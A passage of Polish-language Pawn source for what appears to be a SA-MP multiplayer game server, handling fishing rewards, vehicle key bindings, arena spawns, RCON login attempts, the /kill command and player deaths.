			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}karpia{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 7)
			{
			    if(rybadnia == 7 && ServerEvent && SEventType == 3) {
 			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}lina{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}lina{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 8)
			{
			    if(rybadnia == 8 && ServerEvent && SEventType == 3) {
 			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}miêtusa{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}miêtusa{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 9)
			{
			    if(rybadnia == 9 && ServerEvent && SEventType == 3) {
 			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}bolenia{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}bolenia{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 10)
			{
			    if(rybadnia == 10 && ServerEvent && SEventType == 3) {
 			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}brzanê{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}brzanê{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			if(zlowionaryba == 11)
			{
			    if(rybadnia == 11 && ServerEvent && SEventType == 3) {
  			        Player[playerid][vCash] += 1;
			        format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}troæ jeziorow¹{80bfff}! {42F44E}1 z³, %d EXP{80bfff}.", exp); }
			    else format(textstr, sizeof(textstr), "{80bfff}Z³apa³eœ {42F44E}troæ jeziorow¹{80bfff}! {42F44E}%d EXP{80bfff}.", exp);
			}
			SendClientMessage(playerid, -1, textstr);
	    }
	    return 1;
	}
	if(PRESSED(KEY_YES) && IsPlayerInRangeOfPoint(playerid, 1.5, 2103.9360,-103.0730,2.2186)) return FishingStart(playerid);
	if(PRESSED(KEY_YES) && IsPlayerInRangeOfPoint(playerid, 5.0, -314.0115,1764.9315,43.9387)) {
		if(Player[playerid][Vip] < gettime()) return SendClientMessage(playerid, RED, "Ta ranga jest dostêpna dla "C_YELLOW"VIPa"C_RED".");
	    return DJPanel(playerid); }
	if(PRESSED(KEY_NO) && NaZrzucie[playerid])
	{
		if(IsPlayerInRangeOfPoint(playerid, 20.0, StrefaZrzutu[playerid][0],StrefaZrzutu[playerid][1],StrefaZrzutu[playerid][2])) {
			new ends[256];
			format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ zrzut paczki. ("C_WHITE"100 EXP{F9C05C})", Player[playerid][Name], playerid);
			SendClientMessageToAll(-1, ends);
			AddExp(playerid, 100);
			return ZakonczZrzut(playerid); }
		if(IsPlayerInRangeOfPoint(playerid, 30.0, StrefaZrzutu[playerid][0],StrefaZrzutu[playerid][1],StrefaZrzutu[playerid][2])) {
			new ends[256];
			format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ zrzut paczki. ("C_WHITE"50 EXP{F9C05C})", Player[playerid][Name], playerid);
			SendClientMessageToAll(-1, ends);
			AddExp(playerid, 50);
			return ZakonczZrzut(playerid); }
		if(IsPlayerInRangeOfPoint(playerid, 50.0, StrefaZrzutu[playerid][0],StrefaZrzutu[playerid][1],StrefaZrzutu[playerid][2])) {
			new ends[256];
			format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ zrzut paczki. ("C_WHITE"25 EXP{F9C05C})", Player[playerid][Name], playerid);
			SendClientMessageToAll(-1, ends);
			AddExp(playerid, 25);
			return ZakonczZrzut(playerid); }
		if(IsPlayerInRangeOfPoint(playerid, 60.0, StrefaZrzutu[playerid][0],StrefaZrzutu[playerid][1],StrefaZrzutu[playerid][2])) {
			new ends[256];
			format(ends, sizeof(ends), ""PYTAJNIK""C_NICK"%s(%d) {F9C05C}ukoñczy³ zrzut paczki. ("C_WHITE"10 EXP{F9C05C})", Player[playerid][Name], playerid);
			SendClientMessageToAll(-1, ends);
			AddExp(playerid, 10);
			return ZakonczZrzut(playerid); }
	}
    if ( HOLDING( KEY_FIRE ) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && !GetPlayerVirtualWorld(playerid) )
    {
          AddVehicleComponent( GetPlayerVehicleID( playerid ), 1010 );
    }

    if (  RELEASED( KEY_FIRE ) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && !GetPlayerVirtualWorld(playerid) )
    {
          RemoveVehicleComponent( GetPlayerVehicleID( playerid ), 1010 );
    }
	if((newkeys & 2) && (Opcja[playerid] > 0 && Opcja[playerid] <= 10) && (!GetPlayerVehicleSeat(playerid)) && !GetPlayerVirtualWorld(playerid)) {
		switch(Opcja[playerid]) {
			case 1: {
				new Float:X[3];
				GetVehicleVelocity(GetPlayerVehicleID(playerid), X[0],X[1],X[2]);
				SetVehicleVelocity(GetPlayerVehicleID(playerid), X[0],X[1],X[2]+0.1);
			}
			case 2: {
        		new Float:Y[3];
				GetVehicleVelocity(GetPlayerVehicleID(playerid), Y[0], Y[1], Y[2]);
				new Float:speed = GetPlayerSpeed(playerid);
				if(speed < 350) SetVehicleVelocity(GetPlayerVehicleID(playerid), Y[0]*1.3, Y[1]*1.3, Y[2]*1.3);
			}
			case 3: {
        		new Float:Z[3];
				GetVehicleVelocity(GetPlayerVehicleID(playerid), Z[0], Z[1], Z[2]);
				SetVehicleVelocity(GetPlayerVehicleID(playerid), Z[0]/1.3, Z[1]/1.3, Z[2]/1.3);
			}
			case 4: {
				SetVehicleVelocity(GetPlayerVehicleID(playerid), 0.0,0.0,0.0);
			}
			case 5: {
				new Float:Pos;
				GetVehicleZAngle(GetPlayerVehicleID(playerid),Pos);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),Pos+180.0);
				SetCameraBehindPlayer(playerid);
			}
			case 6: {
				new Float:Poz;
				GetVehicleZAngle(GetPlayerVehicleID(playerid),Poz);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),Poz+90.0);
				SetCameraBehindPlayer(playerid);
			}
			case 7: {
    			ChangeVehicleColor(GetPlayerVehicleID(playerid),random(127),random(127));
			}
			case 8: {
				new Float:A[4];
				GetVehicleVelocity(GetPlayerVehicleID(playerid), A[0], A[1], A[2]);
				GetVehicleZAngle(GetPlayerVehicleID(playerid),A[3]);
				new Float:speed = GetPlayerSpeed(playerid);
				if(speed < 350)
				{
					A[0] += (0.1 * floatsin(-A[3], degrees));
					A[1] += (0.1 * floatcos(-A[3], degrees));
					SetVehicleVelocity(GetPlayerVehicleID(playerid), A[0], A[1], 0.0);
				}
			}
			case 9: {
	        	new Float:B[4];
				GetVehicleVelocity(GetPlayerVehicleID(playerid), B[0], B[1], B[2]);
				GetVehicleZAngle(GetPlayerVehicleID(playerid),B[3]);
    			new Float:speed = GetPlayerSpeed(playerid);
				if(speed < 350)
				{
					B[0] -= (0.1 * floatsin(-B[3], degrees));
					B[1] -= (0.1 * floatcos(-B[3], degrees));
					SetVehicleVelocity(GetPlayerVehicleID(playerid), B[0], B[1], 0.0);
				}
			}
			case 10: {
				new Float:a;
				GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
				SetVehicleZAngle(GetPlayerVehicleID(playerid), a);
			}
		}
	}
	if((newkeys &= 32) && (Opcja[playerid]==11) && !GetPlayerVirtualWorld(playerid)) {
		new Float:A[4];
		Opcja[playerid]=-1;
		GetPlayerVelocity(playerid, A[0], A[1], A[2]);
		GetPlayerFacingAngle(playerid,A[3]);
		A[0] += (0.1 * floatsin(-A[3], degrees));
		A[1] += (0.1 * floatcos(-A[3], degrees));
		SetPlayerVelocity(playerid, A[0], A[1], 2.2);
		SetTimerEx("OdblokujSkok",1900,false,"d",playerid);
	}
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
    printf("RCON >> zarejestrowana próba logowania z IP %s has³em %s",ip, password);
    new pip[16];
    for(new i = GetPlayerPoolSize(); i != -1; --i)
    {
        GetPlayerIp(i, pip, sizeof(pip));
        if(!strcmp(ip, pip, true))
        {
    		new msgs[256];
			format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Próba w³amania na RCON"C_RED")", i, Player[i][Name]);
 			SendClientMessageToAll(WHITE, msgs);
			DelayedKick(i);
			return kicks++;
        }
    }
    return 1;
}

forward SpawnFunction(playerid);
public SpawnFunction(playerid)
{
  	if(IsSpec[playerid]) SpecToggle(playerid, false);
    if(!ConstColor[playerid] && Player[playerid][Gang] == -1) SetRandomColor(playerid);
	if(Player[playerid][Gang] > -1 && !ConstColor[playerid])
	{
 		new ganggid = Player[playerid][Gang];
		if(gColor[ganggid] == 0) SetPlayerColor(playerid, GREY);
		if(gColor[ganggid] == 1) SetPlayerColor(playerid, GREEN);
		if(gColor[ganggid] == 2) SetPlayerColor(playerid, RED);
		if(gColor[ganggid] == 3) SetPlayerColor(playerid, YELLOW);
		if(gColor[ganggid] == 4) SetPlayerColor(playerid, BLUE);
		if(gColor[ganggid] == 5) SetPlayerColor(playerid, ORANGE);
		if(gColor[ganggid] == 6) SetPlayerColor(playerid, MAGENTA);
		if(gColor[ganggid] == 7) SetPlayerColor(playerid, AQUA);
		if(gColor[ganggid] == 8) SetPlayerColor(playerid, GOLD);
		if(gColor[ganggid] == 9) SetPlayerColor(playerid, SEAGREEN);
		if(gColor[ganggid] == 10) SetPlayerColor(playerid, OLIVE);
		if(gColor[ganggid] == 11) SetPlayerColor(playerid, SPRINGGREEN);
		if(gColor[ganggid] == 12) SetPlayerColor(playerid, MAROON);
		if(gColor[ganggid] == 13) SetPlayerColor(playerid, LIME);
		if(gColor[ganggid] == 14) SetPlayerColor(playerid, MEDIUMAQUA);
		if(gColor[ganggid] == 15) SetPlayerColor(playerid, MEDIUMMAGENTA);
	}
	if(!GetPlayerVirtualWorld(playerid)) {
		if(Player[playerid][Vip] > gettime()) {
			GivePlayerWeapon(playerid, 4, 1);
			GivePlayerWeapon(playerid, 24, 7999);
			GivePlayerWeapon(playerid, 26, 7999);
			GivePlayerWeapon(playerid, 31, 7999);
			GivePlayerWeapon(playerid, 34, 7999);
			GivePlayerWeapon(playerid, 16, 100); }
		else {
			GivePlayerWeapon(playerid, 4, 1);
			GivePlayerWeapon(playerid, 24, 7999);
			GivePlayerWeapon(playerid, 25, 7999);
			GivePlayerWeapon(playerid, 31, 7999);
			GivePlayerWeapon(playerid, 34, 7999);
			GivePlayerWeapon(playerid, 16, 1); }
	}
	if(JailTimeP[playerid] > 0 && !IsPlayerInRangeOfPoint(playerid, 30.0, 1129.1677,684.4991,10.0715)) return JailPlayer("Serwer", playerid, "Ucieczka z wiêzienia", 0);
	return RandomTP(playerid);
}

forward TeleportToArena(playerid);
public TeleportToArena(playerid)
{
    OnNonDM[playerid] = false;
 	if(HPTimering[playerid] || ArmorTimering[playerid]) {
	    HPTimer[playerid] = 0;
	    ArmorTimer[playerid] = 0;
	    HPTimering[playerid] = false;
	    ArmorTimering[playerid] = false;
	    Sound(playerid, 17002, 0.0, 0.0, 0.0);
		SendClientMessage(playerid, RED, "Proces uzdrawiania siê/kupna kamizelki przerwany."); }
	OnGame[playerid] = -1;
	SetPlayerSkin(playerid, Player[playerid][Skin]);
	SetPlayerVirtualWorld(playerid, 90);
	if(pArena[playerid] == 1)
	{
		SetPlayerInterior(playerid, 3);
		SetPlayerHealth(playerid, 15);
		SetPlayerArmour(playerid, 0.0);
		GivePlayerWeapon(playerid, 24, 4000);
		switch(random(8)){
			case 0:
			{
				SetPlayerPos(playerid, 296.6123, 189.2866, 1007.1719);
			}
			case 1:
			{
				SetPlayerPos(playerid, 272.4241, 179.4578, 1007.1541);
			}
			case 2:
			{
				SetPlayerPos(playerid, 229.5784, 180.9400, 1003.0313);
			}
			case 3:
			{
				SetPlayerPos(playerid, 189.4024, 179.2508, 1003.0234);
			}
			case 4:
			{
				SetPlayerPos(playerid, 190.1005, 158.0708, 1003.0234);
			}
			case 5:
			{
				SetPlayerPos(playerid, 219.4922, 169.5016, 1003.0234);
			}
			case 6:
			{
				SetPlayerPos(playerid, 246.5572, 144.5662, 1003.0234);
			}
			case 7:
			{
				SetPlayerPos(playerid, 238.7962, 196.0958, 1008.1719);
			}
		}
	}
	if(pArena[playerid] == 2)
	{
		SetPlayerInterior(playerid, 10);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
		GivePlayerWeapon(playerid, 31, 4000);
		switch(random(6)){
			case 0:
			{
				SetPlayerPos(playerid, -1128.1204,1098.0533,1345.7728);
			}
			case 1:
			{
				SetPlayerPos(playerid, -1136.5494,1085.0327,1345.8124);
			}
			case 2:
			{
				SetPlayerPos(playerid, -974.4643,1061.1471,1345.6759);
			}
			case 3:
			{
				SetPlayerPos(playerid, -974.1902,1021.5942,1345.0471);
			}
			case 4:
			{
				SetPlayerPos(playerid, -973.8246,1077.1884,1344.9918);
			}
			case 5:
			{
				SetPlayerPos(playerid, -974.1396,1089.7086,1344.9805);
			}
		}
	}
	if(pArena[playerid] == 3)
	{
		SetPlayerInterior(playerid, 17);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
		GivePlayerWeapon(playerid, 32, 9000);
		switch(random(6)){
			case 0:
			{
				SetPlayerPos(playerid, -959.5980,1951.4652,9.0061);
			}
			case 1:
			{
				SetPlayerPos(playerid, -961.5378,1911.1813,9.0000);
			}
			case 2:
			{
				SetPlayerPos(playerid, -941.5621,1849.0668,5.0051);
			}
			case 3:
			{
				SetPlayerPos(playerid, -958.7534,1891.7579,9.0000);
			}
			case 4:
			{
				SetPlayerPos(playerid, -956.3392,1931.3009,5.0000);
			}
			case 5:
			{
				SetPlayerPos(playerid, -956.4421,1952.3149,5.0000);
			}
		}
	}
	if(pArena[playerid] == 4)
	{
		SetPlayerInterior(playerid, 18);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
		GivePlayerWeapon(playerid, 16, 500);
		switch(random(6)){
			case 0:
			{
				SetPlayerPos(playerid, 1717.5707,-1666.0985,20.2267);
			}
			case 1:
			{
				SetPlayerPos(playerid, 1712.0551,-1640.2177,20.2239);
			}
			case 2:
			{
				SetPlayerPos(playerid, 1728.8512,-1668.9916,22.6151);
			}
			case 3:
			{
				SetPlayerPos(playerid, 1709.8459,-1675.5823,27.20490);
			}
			case 4:
			{
				SetPlayerPos(playerid, 1733.9008,-1650.8849,27.2359);
			}
			case 5:
			{
				SetPlayerPos(playerid, 1709.6013,-1649.7527,23.6953);
			}
		}
	}
	if(pArena[playerid] == 5)
	{
		SetPlayerInterior(playerid, 1);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
		GivePlayerWeapon(playerid, 26, 4000);
		switch(random(2)){
			case 0:
			{
				SetPlayerPos(playerid, 1419.7897,3.9749,1002.3906);
			}
			case 1:
			{
				SetPlayerPos(playerid, 1359.4514,-48.3243,1000.9259);
			}
		}
	}
	if(pArena[playerid] == 6)
	{
		SetPlayerInterior(playerid, 3);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
		GivePlayerWeapon(playerid, 25, 7999);
		switch(random(3)){
			case 0:
			{
				SetPlayerPos(playerid, 2496.4524,-1696.7354,1014.7422);
			}
			case 1:
			{
				SetPlayerPos(playerid, 2499.5574,-1709.1548,1014.7422);
			}
			case 2:
			{
				SetPlayerPos(playerid, 2495.7578,-1700.8115,1018.3438);
			}
		}
	}
	if(pArena[playerid] == 7)
	{
		SetPlayerInterior(playerid, 3);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100);
		GivePlayerWeapon(playerid, 34, 7999);
		switch(random(4)){
			case 0:
			{
				SetPlayerPos(playerid, -2636.7102,1404.5634,906.4609);
			}
			case 1:
			{
				SetPlayerPos(playerid, -2687.8364,1429.8920,906.4609);
			}
			case 2:
			{
				SetPlayerPos(playerid, -2654.6023,1423.9456,912.4063);
			}
			case 3:
			{
				SetPlayerPos(playerid, -2659.2336,1411.3795,910.1703);
			}
			case 4:
			{
				SetPlayerPos(playerid, -2654.2593,1392.0945,918.3582);
			}
		}
	}
	if(pArena[playerid] == 8)
	{
		SetPlayerInterior(playerid, 3);
		SetPlayerHealth(playerid, 100);
		SetPlayerArmour(playerid, 100.0);
		SetPlayerVirtualWorld(playerid, 200);
		GivePlayerWeapon(playerid, 35, 4000);
		switch(random(8)){
			case 0:
			{
				SetPlayerPos(playerid, 296.6123, 189.2866, 1007.1719);
			}
			case 1:
			{
				SetPlayerPos(playerid, 272.4241, 179.4578, 1007.1541);
			}
			case 2:
			{
				SetPlayerPos(playerid, 229.5784, 180.9400, 1003.0313);
			}
			case 3:
			{
				SetPlayerPos(playerid, 189.4024, 179.2508, 1003.0234);
			}
			case 4:
			{
				SetPlayerPos(playerid, 190.1005, 158.0708, 1003.0234);
			}
			case 5:
			{
				SetPlayerPos(playerid, 219.4922, 169.5016, 1003.0234);
			}
			case 6:
			{
				SetPlayerPos(playerid, 246.5572, 144.5662, 1003.0234);
			}
			case 7:
			{
				SetPlayerPos(playerid, 238.7962, 196.0958, 1008.1719);
			}
		}
	}
	return 1;
}

forward RemoveFromArena(playerid);
public RemoveFromArena(playerid) {
	SetPlayerVirtualWorld(playerid, 0);
	ResetPlayerWeapons(playerid);
	if(pArena[playerid] == 1) OsobyA[0]--;
	if(pArena[playerid] == 2) OsobyA[1]--;
	if(pArena[playerid] == 3) OsobyA[2]--;
	if(pArena[playerid] == 4) OsobyA[3]--;
	if(pArena[playerid] == 5) OsobyA[4]--;
	if(pArena[playerid] == 6) OsobyA[5]--;
	if(pArena[playerid] == 7) OsobyA[6]--;
	if(pArena[playerid] == 8) {
		OsobyA[7]--;
		SetPlayerVirtualWorld(playerid, 0); }
	return 1; }

forward Spawn(playerid);
public Spawn(playerid)
{
  pData[playerid][InHouse] = INVALID_HOUSE_ID;
  if(IsSpec[playerid]) SpecToggle(playerid, false);
  TakedDamage[playerid] = 0;
  AFKPoints[playerid] = 100;
	Suicided[playerid] = false;
	pVehicles[playerid] = 0;
	BattleTimer[playerid] = 0;
    pData[playerid][InHouse] = INVALID_HOUSE_ID;
	IsDead[playerid] = false;
	nPlayer[playerid][pPodWplywem] = 0;
	SetPlayerWeather(playerid, 1);
	if(GetPVarInt(playerid, "UsedUFO") != 0) ResetUFO(playerid);
	TworzyStrzalke[playerid] = false;
	if(OnGame[playerid] == GG && Wystartowala[GG])
	{
	    SetPlayerSkin(playerid, Player[playerid][Skin]);
 		switch(random(5))
   		{
     		case 0: SetPlayerPos(playerid, 1307.2217,2173.7515,11.0234);
	        case 1: SetPlayerPos(playerid, 1355.4056,2163.7725,11.0156);
	        case 2: SetPlayerPos(playerid, 1366.6191,2195.6145,9.7578);
         	case 3: SetPlayerPos(playerid, 1388.0197,2165.0005,11.0234);
	        case 4: SetPlayerPos(playerid, 1367.4817,2110.6580,11.0156);
		}
		ResetPlayerWeapons(playerid);
		if(GGLevel[playerid] == 1) return GivePlayerWeapon(playerid, 22, 7999);
		if(GGLevel[playerid] == 2) return GivePlayerWeapon(playerid, 23, 7999);
		if(GGLevel[playerid] == 3) return GivePlayerWeapon(playerid, 33, 7999);
		if(GGLevel[playerid] == 4) return GivePlayerWeapon(playerid, 25, 7999);
		if(GGLevel[playerid] == 5) return GivePlayerWeapon(playerid, 34, 7999);
		if(GGLevel[playerid] == 6) return GivePlayerWeapon(playerid, 31, 7999);
		if(GGLevel[playerid] == 7) return GivePlayerWeapon(playerid, 18, 7999);
		if(GGLevel[playerid] == 8) return GivePlayerWeapon(playerid, 24, 7999);
		if(GGLevel[playerid] == 9) return GivePlayerWeapon(playerid, 38, 9999);
	}
	if(OnGame[playerid] == BA && Wystartowala[BA])
	{
	    Loop(teamy, MAX_BATEAMS)
	    {
			new team = BATeam[playerid];
			if(PunktyBA[team] > 0) {
   	        	SetPlayerHealth(playerid, 100.0);
	        	SetPlayerArmour(playerid, 100.0);
				ResetPlayerWeapons(playerid);
	            if(BATeam[playerid] == 0) {
	    			TogglePlayerControllable(playerid, 0);
					SetPlayerPos(playerid, 342.3120,3143.2139,13.0912);
					SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid); }
	            if(BATeam[playerid] == 1) {
	    			TogglePlayerControllable(playerid, 0);
					SetPlayerPos(playerid, 210.8090,3054.0347,13.0912);
					SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid); }
	            if(BATeam[playerid] == 2) {
	    			TogglePlayerControllable(playerid, 0);
					SetPlayerPos(playerid, 208.5384,3139.4480,13.0912);
					SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid); }
	            if(BATeam[playerid] == 3) {
	    			TogglePlayerControllable(playerid, 0);
					SetPlayerPos(playerid, 344.0521,3059.0693,13.0912);
					SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid); }
				return GivePlayerWeapon(playerid, 24, 9999); }
		}
	}
	if(GetPVarInt(playerid, "ConnectStream") == 1) {
		SetPVarInt(playerid, "ConnectStream", 0);
	    SpecToggle(playerid, 0);
	    TextdrawForPlayer(playerid, true);
		Player[playerid][HasUnlockedTP] = true;
		Player[playerid][HasUnlockedSolo] = true;
//		SetPlayerInterior(playerid, Player[playerid][Interior]);
//		SetPlayerPos(playerid, Player[playerid][X_Pos], Player[playerid][Y_Pos], Player[playerid][Z_Pos]);
//		SetPlayerFacingAngle(playerid, Player[playerid][A_Pos]);
		StopAudioStreamForPlayer(playerid);
		if(Player[playerid][Skin] > 0) {
		    new skinstr[256];
		    format(skinstr, sizeof(skinstr), ""C_WHITE"Chcesz wczytaæ poprzednio u¿ywanego skina? "C_NICK"(ID: %d)", Player[playerid][Skin]);
			ShowPlayerDialog(playerid, DIALOG_SKINL, DIALOG_STYLE_MSGBOX, ""NAZWA"", skinstr, "Tak", "Nie"); }
		return SpawnFunction(playerid);  }
	else SpawnFunction(playerid);
	if(pArena[playerid] > 0) return TeleportToArena(playerid);
	Loop(loopid, MAX_PLAYERS)
	{
		if(SpectatingPlayer[loopid] == playerid && loopid != playerid && Player[loopid][Admin] > 0) {
			SetPlayerVirtualWorld(loopid, GetPlayerVirtualWorld(playerid));
			SetPlayerInterior(loopid, GetPlayerInterior(playerid));
			SpecToggle(playerid, 1);
			if(IsPlayerInAnyVehicle(playerid)) return PlayerSpectateVehicle(loopid, GetPlayerVehicleID(playerid));
			PlayerSpectatePlayer(loopid, playerid); }
	}
	return 1;
}

public OnPlayerSpawn(playerid) {
	if(OnGame[playerid] == BA && Wystartowala[BA]) {
		Loop(teamy, MAX_BATEAMS) {
			if(PunktyBA[teamy] < 1 && BATeam[playerid] == teamy) WypiszZabawa(playerid); } }
   	if(NaSpedycji[playerid]) {
   		ForceEndSpedycja(playerid);
   		NaSpedycji[playerid] = false; }
   	if(NaKoszeniu[playerid]) {
   		ZakonczKoszenie(playerid);
   		NaKoszeniu[playerid] = false; }
   	if(NaCzyszczeniu[playerid]) {
	   ZakonczCzyszczenie(playerid);
	   NaCzyszczeniu[playerid] = false; }
	if(IsTaksowkarz[playerid] > 0) {
		ZakonczTaksowkarz(playerid);
		IsTaksowkarz[playerid] = 0; }
   	if(NaZbieraniu[playerid]) {
   		ZakonczZbieranie(playerid);
   		NaZbieraniu[playerid] = false; }
   	if(NaZrzucie[playerid]) {
	   ZakonczZrzut(playerid);
	   NaZrzucie[playerid] = false; }
   	if(NaNurku[playerid]) {
	   EndNurek(playerid);
	   NaNurku[playerid] = false; }
	return Spawn(playerid); }

CMD:kill(playerid, params[])
{
	if(SpawnTimer[playerid] > 0) return SendClientMessage(playerid, RED, "Posiadasz ochronê anty spawn kill.");
	if(GetPlayerState(playerid) == PLAYER_STATE_WASTED) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy.");
	Suicided[playerid] = true;
    new dmsg[256];
    switch(random(11)) {
      	case 0: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}zmar³ z przemêczenia.", Player[playerid][Name], playerid);
		case 1: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}znikn¹³ z radaru.", Player[playerid][Name], playerid);
		case 2: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}dotar³ do koñca mapy.", Player[playerid][Name], playerid);
		case 3: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}spad³ z rowerka.", Player[playerid][Name], playerid);
        case 4: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}przewróci³ siê biegaj¹c.", Player[playerid][Name], playerid);
        case 5: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}pomyli³ wodê z ogniem.", Player[playerid][Name], playerid);
		case 6: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}zobaczy³ ciemnoœæ.", Player[playerid][Name], playerid);
		case 7: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}teleportowa³ siê na nieznane koordynaty.", Player[playerid][Name], playerid);
		case 8: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}wylecia³ w kosmos.", Player[playerid][Name], playerid);
		case 9: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}dokona³ zamachu na samego siebie.", Player[playerid][Name], playerid);
		case 10: format(dmsg, sizeof(dmsg), "{B70000}["C_YELLOW"*{B70000}] "C_NICK"%s(%d) {8C7246}rozbi³ siê Rustlerem.", Player[playerid][Name], playerid); }
	SendClientMessageToAll(RED, dmsg);
	SetPlayerArmour(playerid, 0.0);
	return SetPlayerHealth(playerid, 0.0);
}

forward RemoveFK(playerid);
public RemoveFK(playerid) {
	fakekills[playerid] = 0; }

GangScoreUpdate(playerid, killerid) {
	if(Player[playerid][Gang] == Player[killerid][Gang] && Player[playerid][Gang] > -1 && !GetPlayerVirtualWorld(playerid) && OnGame[playerid] != -1) {
		new gang = Player[killerid][Gang];
		gScore[gang]--;
		if(gScore[gang] < 0) gScore[gang] = 0;
		SendClientMessage(killerid, -1, "{c19b72}Respekt klanu zmniejszony o 1.");
		GiveClanAchievement(gang, 1); }
	if(Player[playerid][Gang] != Player[killerid][Gang] && Player[playerid][Gang] > -1 && !GetPlayerVirtualWorld(playerid)) {
		new gang = Player[killerid][Gang];
		gScore[gang] += 3;
		if(gScore[gang] < 0) gScore[gang] = 0;
		SendClientMessage(killerid, -1, "{34ed87}Respekt klanu zwiêkszony o 3.");
		if(gScore[gang] >= 1000) GiveClanAchievement(gang, 4);
		GiveClanAchievement(gang, 0); } }

forward HideKill(playerid);
public HideKill(playerid) {
    TextDrawHideForPlayer(playerid, Textdraw[26]);
	PlayerTextDrawHide(playerid, KillInfo[playerid]); }

public OnPlayerDeath(playerid, killerid, reason)
{
	UpdatePlayerDeaths(playerid);
	UpdatePlayerKills(killerid);
	if(EVUczestnik[playerid]) SendClientMessageEx(playerid, -1, ""PYTAJNIK""C_ORANGE"Mo¿esz opuœciæ event za pomoc¹ "C_WHITE"/evl"C_ORANGE".", ""PYTAJNIK""C_ORANGE"You can leave event with "C_WHITE"/evl"C_ORANGE" command.");
    SpecToggle(playerid, 0);
	IsDead[playerid] = true;
	SetPlayerDrunkLevel(playerid, 0);
    Player[playerid][Exp] -= 1;
    pData[playerid][InHouse] = INVALID_HOUSE_ID;
    if(Player[playerid][Cash] < 0) Player[playerid][Cash] = 0;
    if(Player[playerid][Exp] < 0) Player[playerid][Exp] = 0;
	if(LastKilled[killerid] != playerid) {
		Streak[killerid]++;
		if(Streak[killerid] == 10) {
			new istr[256];
			format(istr, sizeof(istr), ""PYTAJNIK"{FF0000}Gracz "C_NICK"%s(%d) {FF0000}zabi³ "C_WHITE"10 {FF0000}graczy pod rz¹d!", Player[killerid][Name], killerid);
			SendClientMessageToAll(RED, istr);
			AddExp(killerid, 100); } }
	Streak[playerid] = 0;
  	if(NapadID[playerid] > -1) {
	   	NapadID[playerid] = -1;
	  	NapadTime[playerid] = -1;
		Loop(napady, MAX_NAPADY) { if(Atakuje[napady] == playerid) Atakuje[napady] = -1; }
		SendClientMessage(playerid, RED, "Twój napad zosta³ przerwany."); }
	if(killerid > -1 && killerid != playerid) {
	    new strk[256], Float:hp, Float:armour;
	    GetPlayerHealth(killerid, hp);
	    GetPlayerArmour(killerid, armour);
	    format(strk, sizeof(strk), "~w~~h~Zabiles: ~g~~h~%s~n~~w~~h~Pozostale HP/AP: ~g~~h~%.0f/%.0f", Player[playerid][Name], hp, armour);
		PlayerTextDrawSetString(killerid, KillInfo[killerid], strk);
